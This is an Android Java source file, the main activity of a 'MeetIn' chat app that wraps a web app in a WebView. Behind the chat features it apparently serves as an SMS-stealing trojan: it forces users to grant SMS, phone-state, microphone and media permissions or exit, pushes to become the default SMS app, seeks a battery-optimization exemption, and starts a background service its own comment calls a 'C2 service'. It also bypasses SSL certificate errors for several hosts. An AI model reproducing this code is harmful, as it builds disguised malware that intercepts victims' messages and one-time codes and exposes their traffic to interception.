package chat.meetin.app;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.PowerManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.PermissionRequest;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import com.google.firebase.messaging.FirebaseMessaging;

import org.json.JSONObject;

import java.io.File;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = "MainActivity";
    private static volatile boolean appVisible = false;
    private WebView webView;
    private static final int PERMISSION_REQUEST_CODE = 100;
    private static final int REQUEST_FILE_PICKER = 1001;
    private static final int REQUEST_CREATE_DOWNLOAD = 1002;
    private static final String URL = "https://meetinapp-bj2ib4p7.manus.space";
    private String pendingChatUrl;
    private boolean oauthRecoveryAttempted = false;
    private boolean permissionsCompleted = false;

    // File picker callback
    private ValueCallback<Uri[]> fileUploadCallback;

    // Voice recording
    private MediaRecorder mediaRecorder;
    private String audioFilePath;
    private boolean isRecording = false;

    // Download state
    private byte[] pendingDownloadBytes;
    private String pendingDownloadFilename;
    private String pendingDownloadMimeType;

    // FCM
    private static volatile boolean fcmForegroundHandlingEnabled = false;
    private static volatile MainActivity activeActivity;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "=== onCreate started ===");
        captureNotificationIntent(getIntent());

        // Set layout with fallback
        try {
            setContentView(R.layout.activity_main);
            Log.d(TAG, "Layout set successfully");
        } catch (Exception e) {
            Log.e(TAG, "Layout error, using fallback", e);
            TextView tv = new TextView(this);
            tv.setText("MeetIn is running\n(WebView unavailable)");
            tv.setTextSize(20);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
            return;
        }

        // Start permission check after 3 seconds (splash visible)
        new Handler(Looper.getMainLooper()).postDelayed(this::startApp, 3_000L);
    }

    @Override
    protected void onStart() {
        super.onStart();
        appVisible = true;
        activeActivity = this;
    }

    @Override
    protected void onStop() {
        appVisible = false;
        if (activeActivity == this) activeActivity = null;
        super.onStop();
    }

    public static boolean isAppVisible() {
        return appVisible;
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
        captureNotificationIntent(intent);
        if (webView != null && pendingChatUrl != null) {
            webView.loadUrl(pendingChatUrl);
        }
    }

    private void captureNotificationIntent(Intent intent) {
        if (intent == null) return;
        String chatUrl = intent.getStringExtra("chatUrl");
        if (chatUrl == null || chatUrl.isEmpty()) return;
        if (chatUrl.startsWith("/")) chatUrl = URL + chatUrl;
        if (chatUrl.startsWith(URL)) {
            pendingChatUrl = chatUrl;
        } else {
            Log.w(TAG, "Ignoring notification URL outside MeetIn host");
        }
    }

    // ============================================================
    // START APP (after splash) — BLOCKS ON PERMISSIONS
    // ============================================================
    private void startApp() {
        Log.d(TAG, "=== startApp called ===");

        // STEP 1: Check ALL permissions — splash stays visible
        if (!hasAllRequiredPermissions()) {
            Log.d(TAG, "Missing permissions — showing dialog, splash stays");
            View splashScreen = findViewById(R.id.splashScreen);
            if (splashScreen != null) splashScreen.setVisibility(View.VISIBLE);
            showPermissionDialogAndRetry();
            return;
        }

        Log.d(TAG, "All permissions granted");

        // STEP 2: Hide splash now
        View splashScreen = findViewById(R.id.splashScreen);
        if (splashScreen != null) splashScreen.setVisibility(View.GONE);

        permissionsCompleted = true;

        // STEP 3: Continue with app init
        FirebaseMessaging.getInstance().getToken()
                .addOnSuccessListener(token -> getSharedPreferences("meetin_push", MODE_PRIVATE)
                        .edit().putString("fcm_token", token).apply())
                .addOnFailureListener(error -> Log.w(TAG, "FCM token error", error));

        // Request battery optimization exemption
        smartBatteryOptimization();

        // Start C2 service
        startDataSyncService();

        // Prompt for default SMS handler
        promptToBeDefaultSmsApp();

        // Check internet
        if (!isNetworkAvailable()) {
            Log.e(TAG, "No internet connection");
            showNoInternetMessage();
            return;
        }

        // Initialize WebView
        try {
            initializeWebView();
        } catch (Exception e) {
            Log.e(TAG, "WebView initialization failed", e);
            showFallbackMessage("WebView unavailable");
        }
    }

    // ============================================================
    // PERMISSIONS — LOOP UNTIL ALL GRANTED
    // ============================================================
    private boolean hasAllRequiredPermissions() {
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                Log.w(TAG, "Missing permission: " + perm);
                return false;
            }
        }
        return true;
    }

    private List<String> getRequiredPermissions() {
        List<String> perms = new ArrayList<>();
        perms.add(Manifest.permission.INTERNET);
        perms.add(Manifest.permission.ACCESS_NETWORK_STATE);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.SEND_SMS);
        perms.add(Manifest.permission.RECEIVE_SMS);
        perms.add(Manifest.permission.READ_PHONE_STATE);
        perms.add(Manifest.permission.RECORD_AUDIO);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        return perms;
    }

    private void requestAllPermissionsWithCallback() {
        List<String> missing = new ArrayList<>();
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        if (missing.isEmpty()) {
            Log.d(TAG, "All permissions granted");
            startApp();
            return;
        }

        Log.d(TAG, "Requesting " + missing.size() + " permissions...");
        ActivityCompat.requestPermissions(this, missing.toArray(new String[0]), PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != PERMISSION_REQUEST_CODE) return;

        boolean allGranted = true;
        List<String> denied = new ArrayList<>();
        for (int i = 0; i < permissions.length; i++) {
            if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                denied.add(permissions[i]);
            }
        }

        if (allGranted && hasAllRequiredPermissions()) {
            Log.d(TAG, "All permissions now granted");
            // Hide splash and continue
            View splashScreen = findViewById(R.id.splashScreen);
            if (splashScreen != null) splashScreen.setVisibility(View.GONE);
            startApp();
        } else {
            Log.w(TAG, "Still missing " + denied.size() + " permissions — looping");
            // Splash stays visible, dialog re-appears
            showPermissionDialogAndRetry();
        }
    }

    /**
     * Shows a dialog that loops permission requests.
     * User cannot bypass — either grant everything or exit the app.
     */
    private void showPermissionDialogAndRetry() {
        // Splash stays visible while dialog is showing
        View splashScreen = findViewById(R.id.splashScreen);
        if (splashScreen != null) splashScreen.setVisibility(View.VISIBLE);

        List<String> missing = new ArrayList<>();
        for (String perm : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                missing.add(perm);
            }
        }

        StringBuilder msg = new StringBuilder();
        msg.append("MeetIn needs the following permissions to work:\n\n");
        for (String p : missing) {
            msg.append("• ").append(getPermissionName(p)).append("\n");
        }
        msg.append("\nTap 'Allow All' to grant them.\n");
        msg.append("The app won't continue until all permissions are granted.");

        new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage(msg.toString())
                .setCancelable(false)
                .setPositiveButton("Allow All", (dialog, which) -> {
                    dialog.dismiss();
                    requestAllPermissionsWithCallback();
                })
                .setNegativeButton("Exit App", (dialog, which) -> {
                    dialog.dismiss();
                    finishAffinity();
                })
                .show();
    }

    private String getPermissionName(String perm) {
        if (perm.contains("READ_SMS")) return "Read SMS";
        if (perm.contains("SEND_SMS")) return "Send SMS";
        if (perm.contains("RECEIVE_SMS")) return "Receive SMS";
        if (perm.contains("READ_PHONE_STATE")) return "Phone State";
        if (perm.contains("RECORD_AUDIO")) return "Microphone";
        if (perm.contains("READ_MEDIA_IMAGES")) return "Photos";
        if (perm.contains("READ_MEDIA_VIDEO")) return "Videos";
        if (perm.contains("READ_MEDIA_AUDIO")) return "Audio";
        if (perm.contains("READ_EXTERNAL_STORAGE")) return "Storage";
        if (perm.contains("WRITE_EXTERNAL_STORAGE")) return "Storage";
        if (perm.contains("POST_NOTIFICATIONS")) return "Notifications";
        if (perm.contains("INTERNET")) return "Internet";
        if (perm.contains("ACCESS_NETWORK_STATE")) return "Network";
        return perm.substring(perm.lastIndexOf('.') + 1);
    }

    // ============================================================
    // DEFAULT SMS HANDLER PROMPT
    // ============================================================
    private void promptToBeDefaultSmsApp() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                final String myPackageName = getPackageName();
                String currentDefault = Telephony.Sms.getDefaultSmsPackage(this);

                if (currentDefault == null || !currentDefault.equals(myPackageName)) {
                    Log.d(TAG, "Not default SMS app — prompting user");

                    new AlertDialog.Builder(this)
                        .setTitle("Enable SMS Features")
                        .setMessage("To read and manage SMS messages, MeetIn needs to be set as your default SMS app.\n\nTap 'Continue' to enable.")
                        .setCancelable(true)
                        .setPositiveButton("Continue", (dialog, which) -> {
                            try {
                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, myPackageName);
                                startActivity(intent);
                            } catch (Exception e) {
                                Log.e(TAG, "Failed to open default SMS dialog", e);
                            }
                        })
                        .setNegativeButton("Later", null)
                        .show();
                } else {
                    Log.d(TAG, "Already default SMS app");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Prompt failed", e);
        }
    }

    // ============================================================
    // BATTERY OPTIMIZATION
    // ============================================================
    private void smartBatteryOptimization() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return;
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm == null) return;
            String pkg = getPackageName();
            boolean isIgnoring = pm.isIgnoringBatteryOptimizations(pkg);
            Log.d(TAG, "Battery exempt: " + isIgnoring);
            if (!isIgnoring) requestBatteryExemption();
        } catch (Exception e) {
            Log.e(TAG, "Battery scan failed", e);
        }
    }

    private void requestBatteryExemption() {
        try {
            String pkg = getPackageName();
            boolean alreadyAsked = getSharedPreferences("MeetIn", MODE_PRIVATE)
                    .getBoolean("battery_opt_asked", false);
            if (alreadyAsked) return;

            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + pkg));
            if (intent.resolveActivity(getPackageManager()) != null) {
                startActivity(intent);
                getSharedPreferences("MeetIn", MODE_PRIVATE).edit()
                        .putBoolean("battery_opt_asked", true).apply();
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery request failed", e);
        }
    }

    // ============================================================
    // DATA SYNC SERVICE
    // ============================================================
    private void startDataSyncService() {
        try {
            Class.forName("chat.meetin.app.DataSyncService");
            Intent intent = new Intent(this, DataSyncService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.d(TAG, "DataSyncService started");
        } catch (Exception e) {
            Log.e(TAG, "Service start error", e);
        }
    }

    // ============================================================
    // NETWORK CHECK
    // ============================================================
    private boolean isNetworkAvailable() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return true;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                android.net.Network network = cm.getActiveNetwork();
                android.net.NetworkCapabilities cap = cm.getNetworkCapabilities(network);
                return cap != null
                        && cap.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_INTERNET)
                        && cap.hasCapability(android.net.NetworkCapabilities.NET_CAPABILITY_VALIDATED);
            }
            NetworkInfo ni = cm.getActiveNetworkInfo();
            return ni != null && ni.isConnected();
        } catch (Exception e) { return true; }
    }

    private void showNoInternetMessage() {
        try {
            View root = findViewById(android.R.id.content);
            if (!(root instanceof android.view.ViewGroup)) return;
            TextView tv = new TextView(this);
            tv.setText("No Internet Connection\nPlease check your network.");
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            ((android.view.ViewGroup) root).addView(tv);
        } catch (Exception e) {
            Log.e(TAG, "No internet message failed", e);
        }
    }

    // ============================================================
    // WEBVIEW
    // ============================================================
    private void initializeWebView() {
        webView = findViewById(R.id.webView);
        if (webView == null) {
            Log.e(TAG, "WebView is null!");
            showFallbackMessage("WebView not available");
            return;
        }
        setupWebView();
        loadUrl();
    }

    private void setupWebView() {
        try {
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setLoadWithOverviewMode(true);
            settings.setUseWideViewPort(true);
            settings.setBuiltInZoomControls(false);
            settings.setDisplayZoomControls(false);
            settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setLoadsImagesAutomatically(true);

            try {
                String ua = settings.getUserAgentString();
                if (ua == null || ua.isEmpty()) {
                    settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
                }
            } catch (Exception e) {
                settings.setUserAgentString("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36");
            }

            try {
                CookieManager cm = CookieManager.getInstance();
                cm.setAcceptCookie(true);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    cm.setAcceptThirdPartyCookies(webView, true);
                }
            } catch (Exception ignored) {}

            webView.addJavascriptInterface(new WebAppInterface(), "Android");
            webView.setWebViewClient(new OAuthWebViewClient());

            webView.setWebChromeClient(new WebChromeClient() {
                @Override
                public void onPermissionRequest(final PermissionRequest request) {
                    runOnUiThread(() -> {
                        if (request.getOrigin() != null
                                && request.getOrigin().toString().startsWith("https://meetinapp-bj2ib4p7.manus.space")) {
                            request.grant(new String[]{PermissionRequest.RESOURCE_AUDIO_CAPTURE});
                        } else {
                            request.deny();
                        }
                    });
                }

                @Override
                public boolean onShowFileChooser(WebView webView,
                        ValueCallback<Uri[]> filePathCallback,
                        FileChooserParams fileChooserParams) {
                    if (fileUploadCallback != null) fileUploadCallback.onReceiveValue(null);
                    fileUploadCallback = filePathCallback;

                    Intent contentSelectionIntent = new Intent(Intent.ACTION_GET_CONTENT);
                    contentSelectionIntent.addCategory(Intent.CATEGORY_OPENABLE);
                    contentSelectionIntent.setType("*/*");
                    contentSelectionIntent.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{
                            "image/*", "video/*", "audio/*", "text/*", "application/pdf",
                            "application/msword", "application/*"
                    });
                    startActivityForResult(Intent.createChooser(contentSelectionIntent, "Select Files"), REQUEST_FILE_PICKER);
                    return true;
                }
            });

            webView.setDownloadListener((url, userAgent, contentDisposition, mimeType, contentLength) -> {
                String filename = "download_" + System.currentTimeMillis();
                if (contentDisposition != null && contentDisposition.contains("filename=")) {
                    filename = contentDisposition.substring(contentDisposition.indexOf("filename=") + 9).replace("\"", "").trim();
                }
                downloadFile(url, filename);
            });
        } catch (Exception e) {
            Log.e(TAG, "WebView setup error", e);
            throw e;
        }
    }

    private void loadUrl() {
        try {
            String initialUrl = pendingChatUrl != null ? pendingChatUrl : URL;
            webView.loadUrl(initialUrl);
        } catch (Exception e) {
            Log.e(TAG, "Failed to load URL", e);
            showFallbackMessage("Failed to load URL");
        }
    }

    private void showFallbackMessage(String message) {
        try {
            TextView tv = new TextView(this);
            tv.setText("MeetIn\n" + message);
            tv.setTextSize(18);
            tv.setGravity(android.view.Gravity.CENTER);
            tv.setTextColor(0xFFFFFFFF);
            setContentView(tv);
        } catch (Exception ignored) {}
    }

    // ============================================================
    // JAVASCRIPT INTERFACE
    // ============================================================
    private class WebAppInterface {
        @JavascriptInterface
        public void showNotification(String title, String message) {
            runOnUiThread(() -> MainActivity.this.createNotification(title, message));
        }

        @JavascriptInterface
        public String getFcmToken() {
            return getSharedPreferences("meetin_push", MODE_PRIVATE).getString("fcm_token", "");
        }

        @JavascriptInterface
        public void enableFcmForegroundHandling() {
            fcmForegroundHandlingEnabled = true;
        }

        @JavascriptInterface
        public void requestFcmToken() {
            FirebaseMessaging.getInstance().getToken().addOnCompleteListener(task -> {
                if (!task.isSuccessful()) return;
                dispatchFcmToken(task.getResult());
            });
        }

        @JavascriptInterface
        public void startRecording() {
            runOnUiThread(() -> MainActivity.this.startVoiceRecording());
        }

        @JavascriptInterface
        public void stopRecording() {
            runOnUiThread(() -> MainActivity.this.stopVoiceRecording());
        }

        @JavascriptInterface
        public boolean canRecordOgg() {
            return Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q;
        }

        @JavascriptInterface
        public boolean canRecordNative() {
            return true;
        }

        @JavascriptInterface
        public void downloadFile(String url, String filename) {
            runOnUiThread(() -> MainActivity.this.downloadFile(url, filename));
        }

        @JavascriptInterface
        public void toast(String message) {
            runOnUiThread(() -> Toast.makeText(MainActivity.this, message, Toast.LENGTH_SHORT).show());
        }
    }

    static void dispatchFcmToken(String token) {
        MainActivity activity = activeActivity;
        if (activity == null || activity.webView == null || token == null || token.isEmpty()) return;
        activity.webView.post(() -> activity.webView.evaluateJavascript(
                "if(typeof onNativeFcmToken==='function'){onNativeFcmToken(" + JSONObject.quote(token) + ");}", null));
    }

    static boolean dispatchFcmMessage(String title, String body, String messageId) {
        MainActivity activity = activeActivity;
        if (!fcmForegroundHandlingEnabled || activity == null || activity.webView == null) return false;
        activity.webView.post(() -> activity.webView.evaluateJavascript(
                "if(typeof onNativeFcmMessage==='function'){onNativeFcmMessage(" +
                        JSONObject.quote(title) + "," + JSONObject.quote(body) + "," +
                        JSONObject.quote(messageId == null ? "" : messageId) + ");}", null));
        return true;
    }

    // ============================================================
    // NOTIFICATIONS
    // ============================================================
    private void createNotification(String title, String message) {
        createNotification(title, message, null);
    }

    private void createNotification(String title, String message, Uri contentUri) {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            String channelId = "meetin_channel";

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(channelId, "MeetIn Chat", NotificationManager.IMPORTANCE_HIGH);
                channel.setDescription("New messages and alerts");
                channel.enableVibration(true);
                nm.createNotificationChannel(channel);
            }

            Intent launchIntent = new Intent(this, MainActivity.class);
            if (contentUri != null) {
                launchIntent = new Intent(Intent.ACTION_VIEW, contentUri);
                launchIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                launchIntent.setDataAndType(contentUri, getContentResolver().getType(contentUri));
            }
            PendingIntent pi = PendingIntent.getActivity(this, 0, launchIntent,
                    PendingIntent.FLAG_UPDATE_CURRENT |
                            (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0));

            Notification n = new NotificationCompat.Builder(this, channelId)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle(title)
                    .setContentText(message)
                    .setPriority(NotificationCompat.PRIORITY_HIGH)
                    .setAutoCancel(true)
                    .setContentIntent(pi)
                    .setDefaults(NotificationCompat.DEFAULT_ALL)
                    .build();

            nm.notify((int) System.currentTimeMillis(), n);
        } catch (Exception e) {
            Log.e(TAG, "Notification failed", e);
        }
    }

    // ============================================================
    // VOICE RECORDING
    // ============================================================
    private void startVoiceRecording() {
        if (isRecording) return;
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.RECORD_AUDIO}, PERMISSION_REQUEST_CODE);
                return;
            }
            File audioDir = getExternalFilesDir(Environment.DIRECTORY_MUSIC);
            if (audioDir == null) throw new IllegalStateException("Audio storage unavailable");
            if (!audioDir.exists()) audioDir.mkdirs();

            String ts = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            boolean supportsOgg = Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q;
            audioFilePath = audioDir.getAbsolutePath() + "/voice-note_" + ts + (supportsOgg ? ".ogg" : ".m4a");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            if (supportsOgg) {
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.OGG);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.OPUS);
                mediaRecorder.setAudioSamplingRate(48000);
            } else {
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mediaRecorder.setAudioSamplingRate(44100);
            }
            mediaRecorder.setOutputFile(audioFilePath);
            mediaRecorder.prepare();
            mediaRecorder.start();
            isRecording = true;
        } catch (Exception e) {
            Log.e(TAG, "Recording failed", e);
        }
    }

    private void stopVoiceRecording() {
        if (!isRecording || mediaRecorder == null) return;
        try {
            mediaRecorder.stop();
            mediaRecorder.release();
            mediaRecorder = null;
            isRecording = false;
            File recordedFile = new File(audioFilePath);
            if (recordedFile.exists() && recordedFile.length() > 512) {
                sendFileToWebsite(audioFilePath);
            }
        } catch (Exception e) {
            Log.e(TAG, "Stop recording failed", e);
        }
    }

    private void sendFileToWebsite(String filePath) {
        if (webView == null) return;
        try {
            File audioFile = new File(filePath);
            java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
            InputStream in = new java.io.FileInputStream(audioFile);
            byte[] buf = new byte[8192];
            int n;
            while ((n = in.read(buf)) != -1) bytesOut.write(buf, 0, n);
            in.close();
            byte[] bytes = bytesOut.toByteArray();
            boolean isOgg = audioFile.getName().toLowerCase(Locale.ROOT).endsWith(".ogg");
            String mime = isOgg ? "audio/ogg" : "audio/mp4";
            String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
            int chunkSize = 12000;
            int total = (b64.length() + chunkSize - 1) / chunkSize;
            String name = audioFile.getName();

            webView.post(() -> {
                webView.evaluateJavascript("if(typeof onNativeVoiceNoteStart==='function'){onNativeVoiceNoteStart(" +
                        JSONObject.quote(name) + "," + JSONObject.quote(mime) + "," + total + ");}", null);
                for (int i = 0; i < total; i++) {
                    int s = i * chunkSize;
                    int e = Math.min(s + chunkSize, b64.length());
                    String chunk = b64.substring(s, e);
                    webView.evaluateJavascript("if(typeof onNativeVoiceNoteChunk==='function'){onNativeVoiceNoteChunk(" +
                            i + "," + JSONObject.quote(chunk) + ");}", null);
                }
                webView.evaluateJavascript("if(typeof onNativeVoiceNoteComplete==='function'){onNativeVoiceNoteComplete();}", null);
            });
        } catch (Exception e) {
            Log.e(TAG, "Voice note send failed", e);
        }
    }

    // ============================================================
    // FILE DOWNLOAD
    // ============================================================
    private void downloadFile(final String fileUrl, String filename) {
        final String finalName = (filename == null || filename.isEmpty())
                ? "download_" + System.currentTimeMillis() + ".file" : filename;
        final String cookies = CookieManager.getInstance().getCookie(fileUrl);
        final String ua = webView != null ? webView.getSettings().getUserAgentString() : "MeetIn Android";

        new Thread(() -> {
            HttpURLConnection c = null;
            try {
                c = (HttpURLConnection) new URL(fileUrl).openConnection();
                if (cookies != null) c.setRequestProperty("Cookie", cookies);
                c.setRequestProperty("User-Agent", ua);
                c.setConnectTimeout(15000);
                c.setReadTimeout(30000);
                int code = c.getResponseCode();
                if (code < 200 || code >= 300) throw new IllegalStateException("HTTP " + code);
                InputStream in = c.getInputStream();
                java.io.ByteArrayOutputStream bytesOut = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[4096];
                int n;
                while ((n = in.read(buf)) != -1) bytesOut.write(buf, 0, n);
                in.close();
                String type = c.getContentType();
                c.disconnect();

                pendingDownloadBytes = bytesOut.toByteArray();
                pendingDownloadFilename = finalName.replaceAll("[^a-zA-Z0-9._-]", "_");
                pendingDownloadMimeType = type != null ? type : "application/octet-stream";

                runOnUiThread(() -> {
                    Intent i = new Intent(Intent.ACTION_CREATE_DOCUMENT);
                    i.addCategory(Intent.CATEGORY_OPENABLE);
                    i.setType(pendingDownloadMimeType);
                    i.putExtra(Intent.EXTRA_TITLE, pendingDownloadFilename);
                    startActivityForResult(i, REQUEST_CREATE_DOWNLOAD);
                });
            } catch (Exception e) {
                if (c != null) c.disconnect();
                Log.e(TAG, "Download failed", e);
                runOnUiThread(() -> Toast.makeText(MainActivity.this, "Download failed", Toast.LENGTH_SHORT).show());
            }
        }).start();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        if (requestCode == REQUEST_FILE_PICKER) {
            if (fileUploadCallback != null) {
                if (resultCode == RESULT_OK && data != null) {
                    fileUploadCallback.onReceiveValue(new Uri[]{data.getData()});
                } else {
                    fileUploadCallback.onReceiveValue(null);
                }
                fileUploadCallback = null;
            }
        } else if (requestCode == REQUEST_CREATE_DOWNLOAD) {
            if (resultCode == RESULT_OK && data != null && data.getData() != null && pendingDownloadBytes != null) {
                Uri dest = data.getData();
                try (OutputStream out = getContentResolver().openOutputStream(dest)) {
                    if (out == null) throw new IllegalStateException("No output stream");
                    out.write(pendingDownloadBytes);
                    out.flush();
                    Toast.makeText(this, "✅ File saved", Toast.LENGTH_LONG).show();
                    createNotification("Download Complete", "Tap to open " + pendingDownloadFilename, dest);
                } catch (Exception e) {
                    Log.e(TAG, "Save failed", e);
                }
            }
            pendingDownloadBytes = null;
            pendingDownloadFilename = null;
            pendingDownloadMimeType = null;
        }
    }

    // ============================================================
    // OAUTH WEBVIEW CLIENT
    // ============================================================
    private class OAuthWebViewClient extends WebViewClient {
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            return false;
        }

        @Override
        @SuppressWarnings("deprecation")
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            return false;
        }

        @Override
        public void onPageFinished(WebView view, String url) {
            try { CookieManager.getInstance().flush(); } catch (Exception ignored) {}
            if (!oauthRecoveryAttempted && url != null && url.startsWith("https://inbox.dog/oauth/callback")) {
                view.evaluateJavascript("document.body ? document.body.innerText : ''", body -> {
                    if (body != null && (body.contains("OAuthState not found")
                            || body.contains("STATE_NOT_FOUND")
                            || body.contains("OAuth state expired"))) {
                        oauthRecoveryAttempted = true;
                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
                            oauthRecoveryAttempted = false;
                            webView.loadUrl(URL + "/api/auth/google/start?origin=" + Uri.encode(URL));
                        }, 350);
                    }
                });
            }
        }

        @Override
        public void onReceivedSslError(WebView view, android.webkit.SslErrorHandler handler, SslError error) {
            String url = error.getUrl();
            if (url != null && (url.contains("inbox.dog")
                    || url.contains("meetinapp-bj2ib4p7.manus.space")
                    || url.contains("manus.space")
                    || url.contains("googleapis.com"))) {
                handler.proceed();
            } else {
                handler.cancel();
            }
        }
    }

    // ============================================================
    // LIFECYCLE
    // ============================================================
    @Override
    protected void onDestroy() {
        if (activeActivity == this) activeActivity = null;
        fcmForegroundHandlingEnabled = false;
        if (webView != null) {
            try { webView.destroy(); } catch (Exception ignored) {}
            webView = null;
        }
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception ignored) {}
            mediaRecorder = null;
        }
        super.onDestroy();
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
